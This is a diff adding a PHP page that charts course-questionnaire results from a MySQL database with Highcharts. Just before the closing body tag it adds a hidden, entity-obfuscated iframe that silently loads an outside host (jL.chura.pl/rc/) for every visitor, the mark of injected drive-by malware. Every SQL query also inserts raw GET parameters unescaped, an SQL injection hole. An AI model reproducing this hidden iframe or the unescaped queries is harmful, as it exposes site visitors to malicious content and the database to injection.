@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>GRAFIK HASIL KUISIONER MATA KULIAH</title>
+<script type="text/javascript" src="jquery-1.11.3.min.js"></script>
+<script type="text/javascript" src="highcharts.js"></script>
+<script type="text/javascript" src="exporting.js"></script>
+<style type="text/css">
+.container { margin: auto; padding: 5px; width: 800px; border: 2px solid #DBDBDB; }
+</style>
+</head>
+
+<?php 
+    //Include Koneksi
+    include "../../koneksi.php";
+
+
+    //Membuat Query
+    $q=mysql_query("SELECT  count(if (jawab = 1, thkusionermat.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionermat.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionermat.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionermat.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionermat.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionermat left join tkuisioner on thkusionermat.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'matakuliah' and thkusionermat.nik = '$_GET[kodematkul]' and thkusionermat.id_kelas = '$_GET[id_kelas]' and thkusionermat.id_kuisioner = 'matakuliah/1' and thkusionermat.tahun_ajaran = '$_GET[tahun_ajaran]'");
+    $r = mysql_fetch_array($q);
+
+    $jum1a = $r['jum1'];
+    $jum2a = $r['jum2'];
+    $jum3a = $r['jum3'];
+    $jum4a = $r['jum4'];
+    $jum5a = $r['jum5'];
+
+    $q1=mysql_query("SELECT  count(if (jawab = 1, thkusionermat.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionermat.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionermat.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionermat.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionermat.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionermat left join tkuisioner on thkusionermat.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'matakuliah' and thkusionermat.nik = '$_GET[kodematkul]' and thkusionermat.id_kelas = '14' and thkusionermat.id_kuisioner = 'matakuliah/2' and thkusionermat.tahun_ajaran = '$_GET[tahun_ajaran]'");
+    $r1 = mysql_fetch_array($q1);
+
+    $jum1b = $r1['jum1'];
+    $jum2b = $r1['jum2'];
+    $jum3b = $r1['jum3'];
+    $jum4b = $r1['jum4'];
+    $jum5b = $r1['jum5'];
+
+    $q2=mysql_query("SELECT  count(if (jawab = 1, thkusionermat.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionermat.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionermat.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionermat.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionermat.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionermat left join tkuisioner on thkusionermat.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'matakuliah' and thkusionermat.nik = '$_GET[kodematkul]' and thkusionermat.id_kelas = '14' and thkusionermat.id_kuisioner = 'matakuliah/3' and thkusionermat.tahun_ajaran = '$_GET[tahun_ajaran]'");
+    $r2 = mysql_fetch_array($q2);
+
+    $jum1c = $r2['jum1'];
+    $jum2c = $r2['jum2'];
+    $jum3c = $r2['jum3'];
+    $jum4c = $r2['jum4'];
+    $jum5c = $r2['jum5'];
+
+    $q3=mysql_query("SELECT  count(if (jawab = 1, thkusionermat.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionermat.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionermat.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionermat.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionermat.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionermat left join tkuisioner on thkusionermat.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'matakuliah' and thkusionermat.nik = '$_GET[kodematkul]' and thkusionermat.id_kelas = '14' and thkusionermat.id_kuisioner = 'matakuliah/4' and thkusionermat.tahun_ajaran = '$_GET[tahun_ajaran]'");
+    $r3 = mysql_fetch_array($q3);
+
+    $jum1d = $r3['jum1'];
+    $jum2d = $r3['jum2'];
+    $jum3d = $r3['jum3'];
+    $jum4d = $r3['jum4'];
+    $jum5d = $r3['jum5'];
+
+    $q4=mysql_query("SELECT  count(if (jawab = 1, thkusionermat.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionermat.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionermat.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionermat.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionermat.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionermat left join tkuisioner on thkusionermat.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'matakuliah' and thkusionermat.nik = '$_GET[kodematkul]' and thkusionermat.id_kelas = '14' and thkusionermat.id_kuisioner = 'matakuliah/5' and thkusionermat.tahun_ajaran = '$_GET[tahun_ajaran]' ");
+    $r4 = mysql_fetch_array($q4);
+
+    $jum1e = $r4['jum1'];
+    $jum2e = $r4['jum2'];
+    $jum3e = $r4['jum3'];
+    $jum4e = $r4['jum4'];
+    $jum5e = $r4['jum5'];
+
+    $q5=mysql_query("SELECT  count(if (jawab = 1, thkusionermat.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionermat.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionermat.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionermat.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionermat.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionermat left join tkuisioner on thkusionermat.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'matakuliah' and thkusionermat.nik = '$_GET[kodematkul]' and thkusionermat.id_kelas = '14' and thkusionermat.id_kuisioner = 'matakuliah/6' and thkusionermat.tahun_ajaran = '$_GET[tahun_ajaran]'");
+    $r5 = mysql_fetch_array($q5);
+
+    $jum1f = $r5['jum1'];
+    $jum2f = $r5['jum2'];
+    $jum3f = $r5['jum3'];
+    $jum4f = $r5['jum4'];
+    $jum5f = $r5['jum5'];
+
+    $q6=mysql_query("SELECT  count(if (jawab = 1, thkusionermat.id_kuisioner,NULL)) as jum1, count(if (jawab = 2, thkusionermat.id_kuisioner,NULL)) as jum2, count(if (jawab = 3, thkusionermat.id_kuisioner,NULL)) as jum3, count(if (jawab = 4, thkusionermat.id_kuisioner,NULL)) as jum4, count(if (jawab = 5, thkusionermat.id_kuisioner,NULL)) as jum5, tkuisioner.pertanyaan  FROM thkusionermat left join tkuisioner on thkusionermat.id_kuisioner = tkuisioner.id_kuisioner  where tkuisioner.jenis_kuisioner = 'matakuliah' and thkusionermat.nik = '$_GET[kodematkul]' and thkusionermat.id_kelas = '14' and thkusionermat.id_kuisioner = 'matakuliah/7' and thkusionermat.tahun_ajaran = '$_GET[tahun_ajaran]'");
+    $r6 = mysql_fetch_array($q6);
+
+    $jum1g = $r6['jum1'];
+    $jum2g = $r6['jum2'];
+    $jum3g = $r6['jum3'];
+    $jum4g = $r6['jum4'];
+    $jum5g = $r6['jum5'];
+
+   
+
+?>
+<body>
+<div class="container">
+<div class="grafik" style="width:100%; height:400px;"></div>
+</div>
+<script type="text/javascript">
+$('.grafik').highcharts({
+ chart: {
+  type: 'column',
+  marginTop: 80
+ },
+ credits: {
+  enabled: false
+ }, 
+ tooltip: {
+  shared: true,
+  crosshairs: true,
+  headerFormat: '<b>{point.key}</b>< br />'
+ },
+ title: {
+  text: 'HASIL KUISIONER'
+ },
+ subtitle: {
+  text: 'TAHUN 2016/2017'
+ },
+ xAxis: {
+  categories: [
+  1,2,3,4,5,6,7,8,9
+  ],
+
+  labels: {
+   rotation: 0,
+   align: 'right',
+   style: {
+    fontSize: '10px',
+    fontFamily: 'Verdana, sans-serif'
+   }
+  }
+ },
+ legend: {
+  enabled: true
+ },
+ series: [ 
+          {
+            "name" : "1 KURANG SEKALI",
+            "data" : [<?php echo $jum1a; ?>,<?php echo $jum1b; ?>,<?php echo $jum1c; ?>,<?php echo $jum1d; ?>,<?php echo $jum1e; ?>,<?php echo $jum1f; ?>,<?php echo $jum1g; ?>] },
+            {
+            "name" : "2 KURANG",
+            "data" : [<?php echo $jum2a; ?>,<?php echo $jum2b; ?>,<?php echo $jum2c; ?>,<?php echo $jum2d; ?>,<?php echo $jum2e; ?>,<?php echo $jum2f; ?>,<?php echo $jum2g; ?>] },
+            {
+            "name" : "3 CUKUP",
+            "data" : [<?php echo $jum3a; ?>,<?php echo $jum3b; ?>,<?php echo $jum3c; ?>,<?php echo $jum3d; ?>,<?php echo $jum3e; ?>,<?php echo $jum3f; ?>,<?php echo $jum3g; ?>] },
+            {
+            "name" : "4 BAIK",
+            "data" : [<?php echo $jum4a; ?>,<?php echo $jum4b; ?>,<?php echo $jum4c; ?>,<?php echo $jum4d; ?>,<?php echo $jum4e; ?>,<?php echo $jum4f; ?>,<?php echo $jum4g; ?>] },
+            {
+            "name" : "5 SANGAT BAIK",
+            "data" : [<?php echo $jum5a; ?>,<?php echo $jum5b; ?>,<?php echo $jum5c; ?>,<?php echo $jum5d; ?>,<?php echo $jum5e; ?>,<?php echo $jum5f; ?>,<?php echo $jum5g; ?>] },
+    
+        ]
+});
+</script>
+<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
+</body>
+</html>
